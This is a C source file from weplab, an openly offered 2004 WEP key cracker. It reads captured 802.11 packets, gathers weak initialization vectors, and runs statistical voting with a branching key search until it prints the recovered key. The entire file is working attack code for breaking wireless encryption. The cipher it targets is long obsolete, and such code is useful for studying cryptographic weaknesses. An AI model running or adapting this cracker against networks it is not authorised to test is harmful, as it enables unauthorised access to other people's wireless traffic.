/*

	weplab - Wep Key Cracker

	Copyright (C) 2004 Jose Ignacio Sanchez Martin - Topo[LB]

	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation; either version 2, or (at your option)
	any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software Foundation,
	Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  

	---------

	heuristics.c: dictionary based wep crack.
*/

#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "wep.h"
#include "globals.h"
#include "debug.h"
#include "heuristics.h"
#include "bruteforce.h"
#include "attack.h"

#define N	256

unsigned long int totalKeysTested=0;
unsigned char keyBranch[13];
unsigned char breathKeyBranch[13];
unsigned long totalBranch=0;
t_bruteforceKey key;

time_t initialTime;
time_t lastTime;
time_t actualTime;

#define MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE	10
unsigned char ranking[13][MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE];

void GuessOutputByte(int keyByte, u_char *sKey, t_StoredPacketsIV *packets, t_storedPacket **controlPackets, unsigned int votes[17][256])
{
  int i, j,k;
  unsigned int x;
  u_char E, S[N];
  u_char K[13 + 3];
  float f;
	unsigned int max, imax;
	short found=0;
	
  unsigned char fakeString[100]="\x3e\x9a\xa0\xa4\xc6\x2e\xad\x59\x5a\x07\xa1\x80\x1f";
	unsigned char *actual_iv;
	unsigned int totalIvs=0;

	unsigned int breath=0;
	unsigned char byteBackup=0;
	unsigned int totalVotes=0;
	unsigned int totalVotesTmp=0;

  if (!sKey) sKey=fakeString;
  memcpy(K + LEN_IV, sKey, keyByte);


	totalBranch++;

	// If it is the last keybyte dont waste time calculating statistics and just try 256 combinations. Is faster!
	if (keyByte==global_v.key_len-1 && global_v.useDebugKey!=global_v.key_len){
		for (i=0; i<=0xFF; i++){
			K[keyByte+LEN_IV]=i;
			keyBranch[keyByte]=i;
			totalKeysTested++;
			if (VerifyPacketWithKey(controlPackets[0],K+LEN_IV)){
				printf("It seems that the first control data packet verifies the key! Let's test it with others....\n\n\n");
				if (Verify10PacketsWithKey(controlPackets, K+LEN_IV)>2){
					actualTime=time(NULL);
					ViewKey(K+LEN_IV,global_v.key_len);
					printf("Right KEY found!!\n");	
					printf("Key cracked in %lu seconds\n", (unsigned long int) actualTime-initialTime);	
					fflush(stdout);
					exit (1);
				}
			}
		}
		return;
	}


	for (i=0; i<=0xFF; i++) votes[keyByte][i]=1;


	actual_iv=packets->iv;

	for (j=0; j<NUMBER_ATTACKS; j++) weakKeyBranch[j][keyByte]=0;

	InitKeyByteSearch();
	
  for(x = 0; x < 0xFFFFFF; x++)
  {
	actual_iv+=IV_ELEM_SIZE;
	if (!actual_iv[5]) break;		// Aborto el bucle si es nulo!
    K[0]=actual_iv[0];
    K[1]=actual_iv[1];
    K[2]=actual_iv[2];
    
   
	memcpy(S,S_InitialBackup,N);

	AttackAndEvaluate(keyByte, sKey, K, S, actual_iv, votes, totalIvs++);

  }

	FinishKeyByteSearch(keyByte,totalIvs,votes);


	// Sort the percentajes
	for (i=0; i<MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; i++) {
		max=0;
		imax=0;
		for (j=0; j<=255; j++){
			if (max<votes[keyByte][j])
			{
				found=0;
				for (x=0; x<i && !found; x++) if (ranking[keyByte][x]==j) found=1;
				if (!found){
					max=votes[keyByte][j];
					imax=j;
				}	
			}
		}
	ranking[keyByte][i]=imax;		
	}

		// Calculate the total ammount, dont taking into account those perc. under 11%
  	for (i=0; i<MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; i++){
  		if (votes[keyByte][ranking[keyByte][i]]>10) totalVotes+=votes[keyByte][ranking[keyByte][i]];
  	}


    // Calculate correction factor
  	f=100/(float)totalVotes;

	// Normalize the percentajes (votes)
	if (totalVotes>100){
		// Normalize recalculating total amount of perc. increasing more the higher probabilities.
		totalVotes=0;
		for (i=0; i<MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; i++){
			votes[keyByte][ranking[keyByte][i]]=(unsigned int)((float)(votes[keyByte][ranking[keyByte][i]]*votes[keyByte][ranking[keyByte][i]]*f));
			totalVotes+=votes[keyByte][ranking[keyByte][i]];
		}
		// Calculate new correction factor
		f=100/(float)totalVotes;
		
		// Normalize again
		for (i=0; i<MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; i++){
			votes[keyByte][ranking[keyByte][i]]=(unsigned int)((float)(votes[keyByte][ranking[keyByte][i]]*f));
		}
	
	}



	// new method to calculate breath based on the desired probability succeed.
	for (breath=0; totalVotesTmp<global_v.percSucceed && breath < MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; breath++){
		totalVotesTmp+=votes[keyByte][ranking[keyByte][breath]];
	}

	// Debug if the user has specified useDebugKey
	if ((global_v.debug>1 && global_v.useDebugKey) || keyByte<global_v.useDebugKey){
		for (j=0; j<NUMBER_ATTACKS;j++){
			if (defaultAttacks[STABILITY_LEVELS][j] && defaultAttacks[global_v.stability][j]){
				printf("KEYBYTE %d --> Attack %u current weaks for keybyte %d: ",(int)keyByte,j+1,(int)keyByte);
				printf("%d\n",weakKeyBranch[j][keyByte]);
			}
		}	
		printf("CANDIDATES: ");
		for (i=0; i<MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE; i++){
			printf("%02x(%u), ",ranking[keyByte][i], votes[keyByte][ranking[keyByte][i]]);	
		}
		printf(" --> breath %u (%u%% requested)\n\n",breath,global_v.percSucceed);
		fflush(stdout);
	}

	// Calculate next branch that will be taken.
	if (keyByte < global_v.key_len-1 && keyByte > global_v.useDebugKey-1){
		// First try to use ranking bytes
		for (i=0; i<breath;i++){
			if (votes[keyByte][ranking[keyByte][i]]){
				K[keyByte+LEN_IV]=ranking[keyByte][i];
				keyBranch[keyByte]=ranking[keyByte][i];
				breathKeyBranch[keyByte]=breath;				
				GuessOutputByte(keyByte+1, K+LEN_IV, packets, controlPackets, votes);			
			}
		}

		// If none of the matching bytes worked and the breath is highest then try all possible bytes (0-FF)
		if (breath==MAX_CANDIDATES_WEAK_VALUES_PER_KEYBYTE){		
			for (i=0; i<256;i++){
				if (votes[keyByte][i]){
					K[keyByte+LEN_IV]=i;
					keyBranch[keyByte]=i;
					breathKeyBranch[keyByte]=breath;				
					GuessOutputByte(keyByte+1, K+LEN_IV, packets, controlPackets, votes);			
				}
			}
		}			
	}else if (keyByte==global_v.useDebugKey-1 && keyByte == global_v.key_len-1){
		//K[keyByte+LEN_IV]=keyBranch[keyByte];
		K[keyByte+LEN_IV]=keyBranch[keyByte];
		if (VerifyPacketWithKey(controlPackets[0],K+LEN_IV)){
			printf("It seems that the first control data packet verifies the key! Let's test it with others....\n\n\n");
			if (Verify10PacketsWithKey(controlPackets, K+LEN_IV)>2){
				actualTime=time(NULL);
				ViewKey(K+LEN_IV,global_v.key_len);
				printf("Right KEY found!\n");
				printf("Key cracked in %lu seconds\n", (unsigned long int) actualTime-initialTime);	
				fflush(stdout);
				exit (1);
			}
		}		
	}
}

void catch_intHeuristics(int sig_num){
	int i,j;
	signal(SIGUSR1, catch_intHeuristics);
	actualTime=time(NULL);
	printf("\n%lu keys tested\n",totalKeysTested);
	printf("%lu branch taken\n",totalBranch);
	if (actualTime-lastTime){
		printf("%lu c/s\n",(unsigned long int)totalKeysTested/(actualTime-lastTime));
		printf("%lu b/s\n",(unsigned long int)totalBranch/(actualTime-lastTime));
	}
	ViewKey (keyBranch,global_v.key_len);
	ViewKey (key.key,global_v.key_len);
	for (j=0; j<NUMBER_ATTACKS;j++){
		if (defaultAttacks[STABILITY_LEVELS][j] && defaultAttacks[global_v.stability][j]){
			printf("Attack %u current weaks :",j+1);
			for (i=0; i<global_v.key_len; i++) printf("byte %d (%d),",i,weakKeyBranch[j][i]);
			printf("\n");
		}
	}	
	fflush(stdout);
}

#define MIN_WEAK_PKT_CAPLEN 20

int GetWeakPackets(pcap_t *pfile, t_StoredPacketsIV *packets){
	FILE * fileDescriptor;
	unsigned long int fileSize=0;
	unsigned long int actualFilePosition;

	unsigned long int perc;
	unsigned long int lastFilePosition=0;
	unsigned char * pkt;
	struct pcap_pkthdr h;
	t_wi_frame *wi_h; 
	unsigned long int totalPackets=0;
	unsigned char *iv;

	unsigned long lastProgressPerc=0;

	int totalValidPackets=0;
	int totalUniqIV=0;
	//unsigned int p_len;

	unsigned char *actual_iv;


	fileDescriptor=pcap_file(pfile);
	actualFilePosition=ftell(fileDescriptor);
	fseek(fileDescriptor,0,SEEK_END);
	fileSize=ftell(fileDescriptor);
	fseek(fileDescriptor,actualFilePosition,SEEK_SET);


	perc=fileSize/100;

	while(1)
	{
	if ((pkt = (unsigned char *) pcap_next(pfile, &h)) == NULL) break;
	totalPackets++;

	actualFilePosition=ftell(fileDescriptor);
	//debug("%u",actualFilePosition);
	if (actualFilePosition-lastFilePosition>perc) {
		printf("\r %lu %% read",lastProgressPerc++);
		fflush(stdout);
		lastFilePosition=actualFilePosition;
	}

	if (global_v.prismHeaderPresent) {
		if (h.len<144+sizeof(t_wi_frame)) {
			if (global_v.debug>2) debug("Packet %u has negative size with prismheader!! Perhaps you dont need --prismheader");
			continue;
		}
		pkt+=144;
	}

    wi_h=(t_wi_frame *)pkt;
    if (h.caplen<MIN_WEAK_PKT_CAPLEN){
		if (global_v.debug>2) debug("Packet %u has different real length (%u) than captured length (%u)",totalPackets,h.len, h.caplen);
	}else if(!(wi_h->wi_frame_ctl_1&0x08)){
		if (global_v.debug>2) debug("Packet %u is not a DATA type packet",totalPackets);	
	}else
	{
		//p_len=h.caplen;

	// First let's check the BSSID if selected
	if (global_v.target_bssid_selected) if (target_bssid(pkt)) {
		if (global_v.debug>2) debug("Packet %u belongs to a different BSSID",totalPackets);
		continue;
	}

		if (((*(((unsigned char *)wi_h)+1))&0xC0)==0xC0) iv=pkt+sizeof(t_wi_frame)+6;
		else iv=pkt+sizeof(t_wi_frame);

		if (global_v.key_len==5 && iv[3]!=global_v.keyid) continue;	// Si no es la key correcta para 64 bits la ignoro

		if (global_v.debug>2){ 
			debug("Packet %u",totalPackets);
			debug("---------------------------------------------");
			DebugViewPacketHeaders(pkt);
			debug("Pcap Len: %u",h.len);			
			debug("---------------------------------------------\n");
		}
		totalValidPackets++;


				if (global_v.debug>2) DebugViewKey(iv,3);			
				actual_iv=packets->iv+((unsigned int)(((unsigned int) iv[0]) | (((unsigned int) iv[1]) << 8) | (((unsigned int) iv[2]) << 16)))*IV_ELEM_SIZE;
				if (!actual_iv[5]){
					actual_iv[0]=iv[0];
					actual_iv[1]=iv[1];
					actual_iv[2]=iv[2];
					actual_iv[3]=iv[4]^0xaa;	
					actual_iv[4]=iv[5]^0xaa;
					actual_iv[5]=0xFF;	
					packets->len++;
					totalUniqIV++;
				}
				
		
	}

	}
printf("\r                                   \n");
debug("Total valid packets read: %u",totalValidPackets);
debug("Total packets read: %u",totalPackets);
debug("Total unique IV read: %u",totalUniqIV);


return totalValidPackets;
}


void WeakPacketsStats(t_StoredPacketsIV *packets){
	printf(" %lu Weak packets gathered:\n",packets->len);

}

void VotesStats( unsigned int votes[13][256]){
	int i,j;
	if (global_v.debug>1)
		for (i=0; i<global_v.key_len; i++) for (j=0; j<256; j++) if (votes[i][j]>0) debug ("%u:%02x --> %u",i,j,votes[i][j]);
			
}


void CalculateSimpleHeuristics(t_StoredPacketsIV *packets,t_storedPacket **controlPackets){
	unsigned int votes[13][256];
	int i,j;

	for (i=0; i<13; i++) for (j=0; j<256; j++) votes[i][j]=0;
//DebugViewKey(global_v.debugKey,13);	

	for (i=0; i<global_v.useDebugKey+1; i++){
		if (global_v.useDebugKey>0 && i!=global_v.useDebugKey) keyBranch[i]=global_v.debugKey[i];
		GuessOutputByte(i, global_v.debugKey, packets, controlPackets, votes);
	}
	printf("\n\nKey NOT found\n");
	printf("Perhaps you should increase the default probability (--perc) to a higher value (default 70%), or capture more packets.\n");
	fflush(stdout);
	VotesStats(votes);	
}

void ReduceTable(unsigned char *t){
	unsigned char *actual_iv=t;
	unsigned char *last_iv=t;
	unsigned int x;
	for(x = 0; x < 0xFFFFFF; x++)
	{
		if (actual_iv!=last_iv && actual_iv[5]) {
			last_iv[0]=actual_iv[0];
			last_iv[1]=actual_iv[1];
			last_iv[2]=actual_iv[2];
			last_iv[3]=actual_iv[3];
			last_iv[4]=actual_iv[4];
			last_iv[5]=actual_iv[5];
			last_iv+=IV_ELEM_SIZE;
			actual_iv[5]=0;
		}
		actual_iv+=IV_ELEM_SIZE;
	}
	
}

#define HUGE_MEM_SIZE	104000000

void heuristics (void){
	t_storedPacket *packets[10];
	t_StoredPacketsIV packetsIV;
	pid_t mpid;
	int c;

	pcap_t *file;
	int i;
	int totalPackets;
	//unsigned char key2[13]="\x3e\x9a\xa0\xa4\xc6\x2e\xad\x59\x5a\x07\xa1\x80\x1f";

	#ifdef _DEBUG
	debug("Starting heuristics based cracking.");
	#endif

	//DebugViewKey(global_v.debugKey,global_v.useDebugKey);

	packetsIV.iv=malloc(HUGE_MEM_SIZE);
	packetsIV.len=0;
	if (!packetsIV.iv) {
		printf("Error: not enough memory to allocate %u",HUGE_MEM_SIZE);	
		exit (-1);
	}

	debug ("Setting the memory to 0s");
	memset(packetsIV.iv,0,HUGE_MEM_SIZE);
	
	debug ("Opening packet file for reading sample encrypted packets");
	file=OpenPcapFile(global_v.packetsFilename);	


	for (i=0; i<10; i++) {
		packets[i]=malloc(sizeof(t_storedPacket));
		packets[i]->packet=NULL;
	}


	totalPackets=GetLessSizedPackets(file, packets);
	DebugView10Packets(packets, totalPackets);
	
	ClosePcapFile(file);

	debug ("Opening packet file for loading all the IV");
	file=OpenPcapFile(global_v.weakPcapFilename);	

	totalPackets=GetWeakPackets(file, &packetsIV);
	WeakPacketsStats(&packetsIV);

	debug ("Compressing IV table...");
	ReduceTable(packetsIV.iv);


	lastTime=time(NULL);
	initialTime=time(NULL);

	if (!(mpid=fork())){	
		signal(SIGUSR1, catch_intHeuristics);
		printf("Statistical cracking started! Please hit enter to get statistics.\n");
		fflush(stdout);
		CalculateSimpleHeuristics(&packetsIV,packets);
	}else{
		while (!waitpid(0,NULL,WNOHANG)) {
			c=getchar();
			if (c=='\n') kill(mpid,SIGUSR1);
		}			
		
	}
	ClosePcapFile(file);
}

